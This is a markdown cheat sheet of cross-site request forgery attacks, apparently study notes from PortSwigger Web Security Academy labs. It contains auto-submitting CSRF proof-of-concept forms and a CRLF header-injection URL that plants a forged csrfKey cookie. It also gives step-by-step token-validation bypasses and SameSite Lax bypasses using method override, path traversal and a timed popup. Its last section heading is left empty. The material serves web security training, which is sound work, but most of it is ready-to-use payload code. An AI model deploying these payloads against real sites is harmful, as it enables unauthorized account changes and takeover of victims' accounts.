# Cross-Site Request Forgery

# TABLE OF CONTENT
- **[Burp Suite CSRF PoF](#burp-suite-csrf-pof)**
- **[Bypass CSRF Token Validation](#bypass-csrf-token-validation)**
- **[Bypass SameSite Cookie Restriction](#bypass-samesite-cookie-restriction)**
- **[Bypassing Referer-based CSRF defenses](#bypass-referer-based-csrf-defenses)**

## Burp Suite CSRF PoF 

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0af9006603a4c51e8051cb9700570098.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hello&#64;world&#46;com" />
      <input type="hidden" name="csrf" value="ael7zVmkzNrxPKdZ2tQDY5FwfguTGHyU" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Bypass CSRF Token validation


### Check if there's any csrf defense mechanism
We can check this by omitting the **`<input type="hidden" name="csrf" value="ASLKCEVLASKSfaksW" />`** part from the above payload. 

### CSRF where token validation depends on request method
Most requests are POST request, which validate the csrf token. However, when chaning these requests to other methods, the token is no longer valid. We can test this by changing the request method.

### CSRF where token validation depends on token bieng present
The token is only validated when it is present. When it is not ( by omitting the value field or the whole thinig like no defense mechanism scenario), there is no CSRF tokekn validation.

### CSRF token is not tied to the user session
Check if we can use CSRF token of 1 account to exploit another account. 
1. Log in account A and acquire its token
2. Log in account B and deliver the payload, modify the token with account A's token

### CSRF token is tied to a non-session cookie
Some applications use different frameworks for csrf tokens, which results in two different tokens being present at the same titme.

```bash
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

1. Check if the `csrfKey` is tied to `csrf`

| Steps | Results |
| ----- | ------- |
| Log in as `wiener:peter` and acquire the user's `csrfKey` and `csrf` values | |
| Capture the request trying to change the user's email. Modify the csrf token so it becomes invalid | If the application accepts the request, we can conclude the csrfKey and csrf are not tied together. Otherwise, continue to the next step. |
| Log in as `carlos:montoya` and capture the user's csrf. Replace wiener's csrf token with carlos' | If the application accepst the request, we can conclud the csrfKey and csrf are not tied together. Otherwise, continue to the next step. |
| Log in as `wiener:peter` and replace wiener's csrfKey and csrf tokens with carlos' | If the application accepts the request, we can conclue the csrf and csrfKey are tied together but the pair doesn't tie to the user-session cookie

2. Look for a functionality that allows us to modify the csrfKey. In this case, we can inject in the search function through GET request

```bash
https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()
```
In the response, we should see the `csrfKey` is set as we wish.
4. Deliver the payload

```bash
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ac5009504bab9d186967b5f002b0096.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hello&#64;world&#46;com" />
      <input type="hidden" name="csrf" value="Your-csrf" />
      <input type="submit" value="Submit request" />
    </form>
      <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-csrfKey%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
**NOTE:** In this case, we assume the search function allows us to set cookies. We can do it directly in the developer tool.

### CSRF where token is duplicated in cookie
Some applications have both csrf token in the session cookies and the request

```bash
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

1. Here we can make up any value for the csrf, either through the Developer Tools or through some functionalities that allow us to set cookie.
2. Deliver the payload (which has csrf set to the value we make up in step 1)

```bash
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a8500dc04f529b58343a52300a900b2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="oops12345&#64;example&#46;com" />
      <input type="hidden" name="csrf" value="random" />
      <input type="submit" value="Submit request"
    </form>
    <img src="https://0a8500dc04f529b58343a52300a900b2.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=random%3b%20SameSite=None" onerror="document.forms[0].submit();" />
  </body>
</html>
```

## Bypass SameSite Cookie Restriction
### Same Site vs Same Origin
Requests are considered same site when the have the same schemes, Top-Level Domain and the additional level of domain.

![image](https://github.com/user-attachments/assets/37f73966-f260-405b-8407-428ff7cab6a4)

Same origins are considered same origin when they have the same schemes, domain names, port numbers 

![image](https://github.com/user-attachments/assets/dc608dc1-bcee-48b1-86bd-005844d5388c)

- Check if the website have SameSite's value set. Otherwise, it is defaulted to be Lax.

### Bypassing SameSite Lax restrictions using GET requests
PHP Symphony has `_method` that allows us to specify the method sent to the server. A regular POST request can be sent to the server under a form of GET request:

```bash
https://example.com/my-account/change-email?email=pwned@web-security-academy.net&_method=POST
```

Payload 
```bash
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
</script>
```

### Bypassing SameSite Lax restrictions with newly issued cookies
Many applications does not have `SameSite` set, in which case Chrome browser will automatically sets it to `Lax` after 120 seconds. Hence, attackers have a two-minute window to perform such attacks. In other words:
  - Attackers must make the browser issue a new cookie
  - Deliver the payload within the two-minute time frame
A sample payload may look like this

```bash
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```
**NOTE:** We use `window.onclick` to invole users' interaction as browsers block pop ups by default.

## Bypassing Referer-based CSRF defenses






